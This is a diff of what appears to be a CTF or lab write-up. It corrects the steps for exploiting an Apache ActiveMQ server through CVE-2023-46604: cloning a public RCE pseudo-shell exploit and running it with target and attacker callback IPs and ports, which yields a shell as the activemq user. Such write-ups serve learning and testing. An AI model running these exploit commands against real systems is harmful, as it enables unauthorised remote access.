@@ -29,16 +29,19 @@ Tested default login credentials:
 
 Identified the version as vulnerable to **CVE-2023-46604**.
 
-Cloned the exploit:
+Cloned the exploit repository:
 
-**git clone [https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell.git]([https://github.com/zeze-zeze/CVE-2023-46604](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell.git))**
-**cd CVE-2023-46604**
+**git clone https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell.git**  
+**cd CVE-2023-46604-ActiveMQ-RCE-pseudoshell**
+
+
 
 Ran the exploit:
 
 **python3 exploit.py -i <target-ip> -p 61616 -si <your-ip> -sp 8080**
 
 > Result: Semi-interactive pseudo-shell as `activemq` user.
+
 
 ---
 
